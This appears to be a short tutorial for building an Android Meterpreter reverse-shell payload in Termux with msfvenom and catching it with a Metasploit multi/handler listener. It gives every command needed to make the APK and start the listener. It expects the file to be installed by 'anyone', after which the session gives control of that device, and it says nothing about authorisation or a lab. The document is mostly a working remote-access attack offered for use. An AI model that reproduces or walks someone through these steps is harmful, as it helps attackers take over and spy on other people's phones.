```
Create Payload In Termux
First, we need to open the MSF console so for that type the command given below.
msfconsole
Now to create payload in termux using Metasploit type the following command
msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4545 R>payload.apk
You need to specify your own LHOST for that just open a new session in your termux and type ifconfig to see your own IP address that you can use and for LPORT you can specify any port that you want but make sure it is not busy in something else.
Now you’ll see a file named pyload.apk in your termux storage. If you have given storage permissions to your termux application then you can move that payload to your internal storage and if you haven’t then you can type termux-setup-storage to give storage permissions to your termux application and then you can move it to your internal storage using the mv command
Setting Up Listener
Now we need to set up a listener for our payload so that we can listen if someone installs that payload.
so to set up a listener for the payload in termux type the following commands.
use multi/handler
Now set the payload that you used while creating payload in termux.
set payload android/meterpreter/reverse_tcp
Now it’s time to set LHOST. Use the same IP address that you used to create the payload.
set LHOST 127.0.0.1
After that set LPORT make sure you use the same port that you used while creating payload in termux.
set LPORT 4545
Now type exploit to start listening.
exploit
Now the listener has started listening and if anyone installs your payload, meterpreter session will be opened and you can use that session to control your device. you can also type help in your session to list all the available commands.
```
